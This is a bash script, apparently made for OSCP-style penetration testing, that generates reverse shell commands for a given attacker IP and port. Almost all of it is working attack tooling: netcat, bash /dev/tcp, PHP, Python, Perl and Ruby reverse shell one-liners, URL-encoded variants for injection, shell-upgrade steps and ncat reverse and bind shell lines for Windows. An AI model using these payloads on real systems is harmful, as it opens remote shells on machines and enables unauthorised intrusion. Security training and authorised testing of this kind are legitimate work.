#!/bin/bash

#------------------------------------------------------------------------------------------------------------------------
# Revere shell code generator
# Author: ooty99
#------------------------------------------------------------------------------------------------------------------------
# This is a heavily modified version of "Revere shell code generator" by ooty99. Please check the original headers and 
# notes below. This version will generate commands usable during different testing operations for Windows and Linux
# environments, usable with security-vm-setup tool created by @ayomawdb.
#------------------------------------------------------------------------------------------------------------------------

#------------------------------------------------------------------------------------------------------------------------
# Revere shell code generator
# Author: ooty99
#------------------------------------------------------------------------------------------------------------------------
# This simple script is designed to save precious time during the OSCP. I wrote it because I got tired of constantly
# copy/pasting one-line reverse shell commands, then opening another terminal pane, using ifconfig, scrolling to tun0,
# then having to move the cursor around and replace <IP ADDR> and <PORT> in the pasted command. This hopefully cuts down
# on some of the extra steps and keeps focus on the exploit.
#
# Feel free to modify anything you would like! Good luck.
#------------------------------------------------------------------------------------------------------------------------

if [ $# -eq 3 ]
  then
    echo "Usage ./commands.sh [source_ip] [source_port] [target_ip]"
fi

# Settings colors to distinguish output
# If your terminal has a background color that makes it hard to see, just paste the commented color code into the two below.
NOCOLOR='\033[0m'
COPYME='\033[0;32m' # Prints green text
DIVIDER='\033[1;33m' #Prints yellow text
# Red: '\033[0;31m'
# Cyan: '\033[0;36m'
# White: '\033[1;37m'
# Black: '\033[0;30m'

urlencode () {
  python -c "import urllib; print urllib.quote('''${command//\'/\'}''')"
}

printcommand() {
  echo -e "${COPYME}"
  echo -e "$command"
  echo -e $(urlencode)
  echo -e "${NOCOLOR}"
}

# HTTP port and SMB share to use for commands
http_port=80
smb_share='share'

# Source information (source port is not taken from interface list, to re-use this in pivoting situations)
if [[ $1 =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
  source_ip=$1
else
  source_ip="$(ip addr show | grep $1 |grep -o 'inet [0-9]*\.[0-9]*\.[0-9]*\.[0-9]*' | grep -o '[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*')"
fi
source_port=$2

# Target information
target=$3

# Ensure port exists
if [ $source_port -gt 65535 ]
then
  echo "You there are only 65,535 ports to listen on!"
  exit
fi

# List out the useful stuff
echo -e "${DIVIDER}[+]======================== Easy Reverse Shell Generator =======================[+]${NOCOLOR}"
echo ""
echo "$source_ip:$source_port --to-> $target"
echo ""
echo "Listen with:  nc -lvp $source_port"
echo ""
echo -e "${DIVIDER}[+] Reverse Shell Commands -----------------------------------------------------[+]${NOCOLOR}"
echo "netcat with -e option:"
command="nc -e /bin/bash $source_ip $source_port"
printcommand
echo ""
echo "netcat without -e option:"
command="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $source_ip $source_port >/tmp/f"
printcommand
echo "Standard reverse TCP:"
command="bash -i >& /dev/tcp/$source_ip/$source_port 0>&1"
printcommand
echo ""
echo -e "${DIVIDER}[+] Programming Language Reverse Shells ----------------------------------------[+]${NOCOLOR}"
echo "PHP:"
command="php -r '$sock=fsockopen(\"$source_ip\",$source_port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
printcommand
echo ""
echo "Python:"
command="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$source_ip",$source_port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
printcommand
echo ""
echo "Perl:"
command="perl -e 'use Socket;$i=\"$source_ip\";$p=$source_port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
printcommand
echo ""
echo "Ruby:"
command="ruby -rsocket -e'f=TCPSocket.open(\"$source_ip\",$source_port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
printcommand
echo ""
echo -e "${DIVIDER}[+] Upgrade Your Shell ----------------------------------------------------------[+]${NOCOLOR}"
echo -e "1) ${COPYME}python -c 'import pty; pty.spawn("/bin/bash")'${NOCOLOR}"
echo -e "2) Enter ctl+z in terminal that is running reverse shell"
echo -e "${COPYME}echo $TERM${NOCOLOR}"
echo -e "${COPYME}stty -a${NOCOLOR}"
echo -e "${COPYME}stty raw -echo${NOCOLOR}"
echo -e "6) ${COPYME}fg${NOCOLOR}"
echo -e "7) ${COPYME}export SHELL=bash${NOCOLOR}"
echo -e "8) ${COPYME}export TERM=xterm-256color${NOCOLOR}"
echo -e "9) ${COPYME}stty rows 38 columns 116${NOCOLOR}"
echo ""
echo ""

# Get parent directory
pwd=$(dirname `pwd`)
# ${pwd//\//\/} is replacing all / characters in path with \/
for i in commands_*.txt; do 
  cat $i | sed "s/\$pwd/${pwd//\//\/}/g" | sed "s/\$target/$target/g" | sed "s/\$source_ip/$source_ip/g" | sed "s/\$source_port/$source_port/g" | sed "s/\$http_port/$http_port/g" | sed "s/\$smb_share/$smb_share/g" | sed "s/\$smb_share/$smb_share/g" | pygmentize; 
done

#Rev
#ncat -lnvp 4444 --allow [win ip] --ssl    # kali
#ncat -nv [kali ip] 4444 -e cmd.exe --ssl

#Bind
#ncat -lnvp 4444 -e cmd.exe --allow [kali ip] --ssl      # win
#ncat -nv [win ip] 4444 --ssl